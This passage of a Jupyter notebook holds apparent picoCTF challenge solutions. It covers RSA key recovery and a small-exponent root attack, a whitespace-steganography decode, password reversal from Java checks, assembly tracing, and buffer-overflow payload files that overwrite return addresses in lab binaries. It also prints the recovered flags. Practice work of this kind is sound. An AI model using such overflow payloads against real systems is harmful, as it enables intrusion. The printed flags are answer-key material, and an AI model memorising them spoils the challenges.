     "execution_count": 355,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 2\n",
    "n = 5051846941\n",
    "p = 54269\n",
    "n % p, n // p"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 356,
   "metadata": {},
   "outputs": [],
   "source": [
    "# 3\n",
    "n = 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913\n",
    "e = 3\n",
    "# muri"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 357,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(1, 836623060)"
      ]
     },
     "execution_count": 357,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 4\n",
    "p = 12611\n",
    "q = 66347\n",
    "gcd(p, q),  (p-1)*(q-1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 358,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813"
      ]
     },
     "execution_count": 358,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 5\n",
    "m = 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717\n",
    "e = 3\n",
    "n = 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331\n",
    "\n",
    "c = pow(m, e, n)\n",
    "c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 317,
   "metadata": {},
   "outputs": [],
   "source": [
    "# 6\n",
    "c = 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323\n",
    "e = 3\n",
    "n = 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359\n",
    "\n",
    "m = int(c ** (1/e))\n",
    "m\n",
    "\n",
    "m, bound = root_e(c, e, n)\n",
    "c2 = pow(m, e, n)\n",
    "\n",
    "# muri"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 359,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729"
      ]
     },
     "execution_count": 359,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 7\n",
    "p = 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559\n",
    "q = 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637\n",
    "e = 65537\n",
    "\n",
    "get_d(p, q, e)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 360,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893"
      ]
     },
     "execution_count": 360,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "p = 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433\n",
    "c = 9276182891752530901219927412073143671948875482138883542938401204867776171605127572134036444953137790745003888189443976475578120144429490705784649507786686788217321344885844827647654512949354661973611664872783393501992112464825441330961457628758224011658785082995945612195073191601952238361315820373373606643521463466376095236371778984942891123936191796720097900593599447528583257806196551724676380135110693228330934418147759387990754368525068685861547977993085149359162754890674487823080750579601100854795031284533864826255207300350679553486505961837349042778851010569582458629638648589442067576234798724906377157351\n",
    "n = 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239\n",
    "\n",
    "q = n // p\n",
    "d = get_d(p, q, e)\n",
    "m = pow(c, d, n)\n",
    "m"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 361,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'picoCTF{wA8_th4t$_ill3aGal..o1828d357}'"
      ]
     },
     "execution_count": 361,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x = hex(m)\n",
    "ans = \"\"\n",
    "for i in range(len(x)//2):\n",
    "    if i == 0:\n",
    "        continue\n",
    "    ans += chr(int(x[2*i:2*i+2], 16))\n",
    "ans"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## what's are different"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 371,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('whats-the-difference/diff.txt') as f:\n",
    "    data = f.read().split(\"\\n\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 373,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}\n"
     ]
    }
   ],
   "source": [
    "ans = \"\"\n",
    "for i in range(len(data)//4):\n",
    "    idx = 4 * i\n",
    "    a = data[idx+1][62:]\n",
    "    b = data[idx+3][62:]\n",
    "    for j in range(len(a)):\n",
    "        if a[j] != b[j]:\n",
    "            ans += b[j]\n",
    "            \n",
    "print(ans)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## whitepages"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"WhitePages/whitepages.txt\") as f:\n",
    "    x = f.read()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "a = '\\u2003'\n",
    "b = ' '"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "ans = \"\"\n",
    "for s in x:\n",
    "    if s == a:\n",
    "        ans += ' '\n",
    "    else:\n",
    "        ans += '\\n'\n",
    "with open(\"whitespace.txt\", 'w') as f:\n",
    "    f.write(ans)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'00001010000010010000100101110000011010010110001101101111010000110101010001000110000010100000101000001001000010010101001101000101010001010010000001010000010101010100001001001100010010010100001100100000010100100100010101000011010011110101001001000100010100110010000000100110001000000100001001000001010000110100101101000111010100100100111101010101010011100100010000100000010100100100010101010000010011110101001001010100000010100000100100001001001101010011000000110000001100000010000001000110011011110111001001100010011001010111001100100000010000010111011001100101001011000010000001010000011010010111010001110100011100110110001001110101011100100110011101101000001011000010000001010000010000010010000000110001001101010011001000110001001100110000101000001001000010010111000001101001011000110110111101000011010101000100011001111011011011100110111101110100010111110110000101101100011011000101111101110011011100000110000101100011011001010111001101011111011000010111001001100101010111110110001101110010011001010110000101110100011001010110010001011111011001010111000101110101011000010110110001011111011000110011000100110110001101110011000000110100001100000110001100110111001100110011100001100101001110000110001001100011011000010110010100110010001100010011000000111001011001010110011000110100011000100110010100110101001110010011011000110000011000100011000101111101000010100000100100001001'"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ans = \"\"\n",
    "for s in x:\n",
    "    if s == a:\n",
    "        ans += '0'\n",
    "    else:\n",
    "        ans += '1'\n",
    "ans"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\t\tpicoCTF\n",
      "\n",
      "\t\tSEE PUBLIC RECORDS & BACKGROUND REPORT\n",
      "\t\t5000 Forbes Ave, Pittsburgh, PA 15213\n",
      "\t\tpicoCTF{not_all_spaces_are_created_equal_c167040c738e8bcae2109ef4be5960b1}\n",
      "\t\t\n"
     ]
    }
   ],
   "source": [
    "ans2 = \"\"\n",
    "for i in range(len(ans)//8):\n",
    "    ans2 += chr(int(ans[8*i: 8*i+8], 2))\n",
    "print(ans2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## valut-door-1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "s = \"\"\"\\\n",
    "password.charAt(0)  == 'd' &&\n",
    "password.charAt(29) == '4' &&\n",
    "password.charAt(4)  == 'r' &&\n",
    "password.charAt(2)  == '5' &&\n",
    "password.charAt(23) == 'r' &&\n",
    "password.charAt(3)  == 'c' &&\n",
    "password.charAt(17) == '4' &&\n",
    "password.charAt(1)  == '3' &&\n",
    "password.charAt(7)  == 'b' &&\n",
    "password.charAt(10) == '_' &&\n",
    "password.charAt(5)  == '4' &&\n",
    "password.charAt(9)  == '3' &&\n",
    "password.charAt(11) == 't' &&\n",
    "password.charAt(15) == 'c' &&\n",
    "password.charAt(8)  == 'l' &&\n",
    "password.charAt(12) == 'H' &&\n",
    "password.charAt(20) == 'c' &&\n",
    "password.charAt(14) == '_' &&\n",
    "password.charAt(6)  == 'm' &&\n",
    "password.charAt(24) == '5' &&\n",
    "password.charAt(18) == 'r' &&\n",
    "password.charAt(13) == '3' &&\n",
    "password.charAt(19) == '4' &&\n",
    "password.charAt(21) == 'T' &&\n",
    "password.charAt(16) == 'H' &&\n",
    "password.charAt(27) == 'b' &&\n",
    "password.charAt(30) == '8' &&\n",
    "password.charAt(25) == '_' &&\n",
    "password.charAt(22) == '3' &&\n",
    "password.charAt(28) == '7' &&\n",
    "password.charAt(26) == '8' &&\n",
    "password.charAt(31) == 'e';\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "d35cr4mbl3_tH3_cH4r4cT3r5_8b748e\n"
     ]
    }
   ],
   "source": [
    "ans = [0] * 32\n",
    "for l in s.split('\\n'):\n",
    "    m = re.search(r\"password.charAt\\((\\d+)\\)\\s+== '(\\w)'\", l)\n",
    "    if m is None:\n",
    "        continue\n",
    "    idx = int(m.group(1))\n",
    "    c = m.group(2)\n",
    "    ans[idx] = c\n",
    "print(''.join(ans))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## like1000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "os.chdir('like1000/')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tarfile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "h = []\n",
    "for i in range(1000):\n",
    "    for f in os.listdir():\n",
    "        if not f.endswith(\".tar\"):\n",
    "            continue\n",
    "\n",
    "        if f in h:\n",
    "            continue\n",
    "\n",
    "        h.append(f)\n",
    "\n",
    "        x = tarfile.open(f)\n",
    "        x.extractall()\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [],
   "source": [
    "os.chdir(\"../\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## vault door 3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```java\n",
    "public boolean checkPassword(String password) {\n",
    "    if (password.length() != 32) {\n",
    "        return false;\n",
    "    }\n",
    "    char[] buffer = new char[32];\n",
    "    int i;\n",
    "    for (i=0; i<8; i++) {\n",
    "        buffer[i] = password.charAt(i);\n",
    "    }\n",
    "    for (; i<16; i++) {\n",
    "        buffer[i] = password.charAt(23-i);\n",
    "    }\n",
    "    for (; i<32; i+=2) {\n",
    "        buffer[i] = password.charAt(46-i);\n",
    "    }\n",
    "    for (i=31; i>=17; i-=2) {\n",
    "        buffer[i] = password.charAt(i);\n",
    "    }\n",
    "    String s = new String(buffer);\n",
    "    return s.equals(\"jU5t_a_sna_3lpm12gb44_u_4_m1r240\");\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "jU5t_a_s1mpl3_an4gr4m_4_u_41b220\n"
     ]
    }
   ],
   "source": [
    "s = \"jU5t_a_sna_3lpm12gb44_u_4_m1r240\"\n",
    "ans = [0] * 32\n",
    "for i in range(8):\n",
    "    ans[i] = s[i]\n",
    "\n",
    "for i in range(8, 16):    \n",
    "    ans[23-i] = s[i]\n",
    "\n",
    "for i in range(16, 32, 2):\n",
    "    ans[46-i] = s[i]\n",
    "\n",
    "for i in range(31, 16, -2):\n",
    "    ans[i] = s[i]\n",
    "print(''.join(ans))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## vault-door-4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [],
   "source": [
    "a = [ 106 , 85  , 53  , 116 , 95  , 52  , 95  , 98, \n",
    " 0x55, 0x6e, 0x43, 0x68, 0x5f, 0x30, 0x66, 0x5f]\n",
    "b = [142, 131, 164, 63 , 163, 137, 70 , 60]\n",
    "c = ['f' , '8' , 'e' , '1' , 'e' , '0' , '4' , '7' ]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [],
   "source": [
    "x = bytearray(len(a) + len(b) + len(c))\n",
    "for i in range(len(a)):\n",
    "    x[i] = a[i]\n",
    "\n",
    "for i in range(len(b)):\n",
    "    x[i + len(a)] = int(str(b[i]), 8)\n",
    "    \n",
    "for i in range(len(c)):\n",
    "    x[i + len(a) + len(b)] = ord(c[i])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"./vault-door-4/flag.txt\", \"wb\") as f:\n",
    "    f.write(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "bytearray(b'jU5t_4_bUnCh_0f_bYt3s_80f8e1e047')"
      ]
     },
     "execution_count": 65,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## asm1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "asm1:\n",
    "\t<+0>:\tpush   ebp\n",
    "\t<+1>:\tmov    ebp,esp\n",
    "\t<+3>:\tcmp    DWORD PTR [ebp+0x8],0x45d\n",
    "\t<+10>:\tjg     0x512 <asm1+37>\n",
    "\t<+12>:\tcmp    DWORD PTR [ebp+0x8],0x430\n",
    "\t<+19>:\tjne    0x50a <asm1+29>\n",
    "\t<+21>:\tmov    eax,DWORD PTR [ebp+0x8]\n",
    "\t<+24>:\tadd    eax,0x17\n",
    "\t<+27>:\tjmp    0x529 <asm1+60>\n",
    "\t<+29>:\tmov    eax,DWORD PTR [ebp+0x8]\n",
    "\t<+32>:\tsub    eax,0x17\n",
    "\t<+35>:\tjmp    0x529 <asm1+60>\n",
    "\t<+37>:\tcmp    DWORD PTR [ebp+0x8],0x7cd\n",
    "\t<+44>:\tjne    0x523 <asm1+54>\n",
    "\t<+46>:\tmov    eax,DWORD PTR [ebp+0x8]\n",
    "\t<+49>:\tsub    eax,0x17\n",
    "\t<+52>:\tjmp    0x529 <asm1+60>\n",
    "\t<+54>:\tmov    eax,DWORD PTR [ebp+0x8]\n",
    "\t<+57>:\tadd    eax,0x17\n",
    "\t<+60>:\tpop    ebp\n",
    "\t<+61>:\tret    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "metadata": {},
   "outputs": [],
   "source": [
    "x = 0x4f3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0x50a'"
      ]
     },
     "execution_count": 87,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "if x == 0x45d:\n",
    "    if x != 0x7cd:\n",
    "        x += 0x17\n",
    "    else:\n",
    "        x -= 0x17\n",
    "else:\n",
    "    if x != 0x430:\n",
    "        x += 0x17\n",
    "    else:\n",
    "        x -= 0x17\n",
    "hex(x)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## asm2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "asm2:\n",
    "\t<+0>:\tpush   ebp\n",
    "\t<+1>:\tmov    ebp,esp\n",
    "\t<+3>:\tsub    esp,0x10\n",
    "\t<+6>:\tmov    eax,DWORD PTR [ebp+0xc]\n",
    "\t<+9>:\tmov    DWORD PTR [ebp-0x4],eax\n",
    "\t<+12>:\tmov    eax,DWORD PTR [ebp+0x8]\n",
    "\t<+15>:\tmov    DWORD PTR [ebp-0x8],eax\n",
    "\t<+18>:\tjmp    0x50c <asm2+31>\n",
    "\t<+20>:\tadd    DWORD PTR [ebp-0x4],0x1\n",
    "\t<+24>:\tadd    DWORD PTR [ebp-0x8],0xa9\n",
    "\t<+31>:\tcmp    DWORD PTR [ebp-0x8],0x47a6\n",
    "\t<+38>:\tjle    0x501 <asm2+20>\n",
    "\t<+40>:\tmov    eax,DWORD PTR [ebp-0x4]\n",
    "\t<+43>:\tleave  \n",
    "\t<+44>:\tret   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0x8b'"
      ]
     },
     "execution_count": 89,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "y = 0x9\n",
    "x = 0x1e\n",
    "while y <= 0x47a6:\n",
    "    x += 0x01\n",
    "    y += 0xa9\n",
    "hex(x)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## overflow1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "metadata": {},
   "outputs": [],
   "source": [
    "os.chdir(\"./OverFlow_1/\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"bin.txt\", 'wb') as f:\n",
    "    x = bytearray(80)\n",
    "    for i in range(76):\n",
    "        x[i] = 0x20\n",
    "    x[79] = 0x08\n",
    "    x[78] = 0x04\n",
    "    x[77] = 0x85\n",
    "    x[76] = 0xE6\n",
    "    f.write(x)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## overflow2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {},
   "outputs": [],
   "source": [
    "os.chdir(\"../OverFlow_2/\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"bin.txt\", 'wb') as f:\n",
    "    a = 188\n",
    "    x = bytearray(a+16)\n",
    "    for i in range(a):\n",
    "        x[i] = 0x20\n",
    "    \n",
    "    x[a+3] = 0x08\n",
    "    x[a+2] = 0x04\n",
    "    x[a+1] = 0x85\n",
    "    x[a] = 0xE6\n",
    "    \n",
    "    a += 4\n",
    "    x[a+3] = 1\n",
    "    x[a+2] = 2\n",
    "    x[a+1] = 3\n",
    "    x[a] = 4\n",
    "    \n",
    "    a += 4\n",
    "    x[a+3] = 0xDE\n",
    "    x[a+2] = 0xAD\n",
    "    x[a+1] = 0xBE\n",
    "    x[a] = 0xEF\n",
    "    \n",
    "    a += 4\n",
    "    x[a+3] = 0xC0\n",
    "    x[a+2] = 0xDE\n",
    "    x[a+1] = 0xD0\n",
    "    x[a] = 0x0D\n",
    "    \n",
    "    f.write(x)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## NewOverFlow-1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 105,
   "metadata": {},
   "outputs": [],
   "source": [
    "os.chdir(\"../NewOverFlow-1/\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 106,
   "metadata": {},
   "outputs": [],
   "source": [
    "addr = \"0000000000400767\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 109,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"bin.txt\", 'wb') as f:\n",
    "    a = 64 + 12\n",
    "    x = bytearray(a+8)\n",
    "    for i in range(a):\n",
    "        x[i] = 0x20\n",
    "    \n",
    "    for i in range(8):\n",
    "        x[a+8-i-1] = int(addr[i], 16)\n",
    "    a += 8\n",
    "    \n",
    "#     for i in range(8):\n",
    "#         x[a+8-i-1] = int(addr[i], 16)\n",
    "#     a += 8\n",
    "    \n",
    "#     for i in range(8):\n",
    "#         x[a+8-i-1] = int(addr[i], 16)\n",
    "#     a += 8\n",
    "\n",
    "#     for i in range(8):\n",
    "#         x[a+8-i-1] = int(addr[i], 16)\n",
    "#     a += 8\n",
    "    \n",
    "#     for i in range(8):\n",
    "#         x[a+8-i-1] = int(addr[i], 16)\n",
    "#     a += 8\n",
    "    \n",
    "#     for i in range(8):\n",
    "#         x[a+8-i-1] = int(addr[i], 16)\n",
    "#     a += 8\n",
    "    \n",
    "    f.write(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
